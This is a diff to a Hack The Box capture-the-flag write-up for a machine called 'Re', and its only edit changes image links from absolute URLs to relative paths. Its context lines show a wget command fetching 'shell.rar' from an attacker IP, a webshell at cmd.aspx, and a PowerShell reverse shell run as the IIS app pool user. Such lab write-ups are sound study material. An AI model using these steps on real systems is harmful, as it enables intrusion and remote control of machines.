@@ -38,7 +38,7 @@ Current site located at http://reblog.htb.
 
 This site can be accessed after putting it into the _/etc/hosts_ file and it is a custom blog page that contains articles about **Reverse Engineering** and **Malware**:
 
-![Blog Page](https://kyuu-ji.github.io/htb-write-up/re/re_web-1.png)
+![Blog Page](re_web-1.png)
 
 Page _About_:
 ```markdown
@@ -297,7 +297,7 @@ wget -o shell.rar http://10.10.14.19/shell.rar
 
 Now the webshell can be accessed by browsing to _re.htb/cmd.aspx_ and command execution works:
 
-![Webshell whoami](https://kyuu-ji.github.io/htb-write-up/re/re_web-2.png)
+![Webshell whoami](re_web-2.png)
 
 We can execute the _shell.ps1_ from before to start a reverse shell as the _iss appool_ user:
 ```markdown
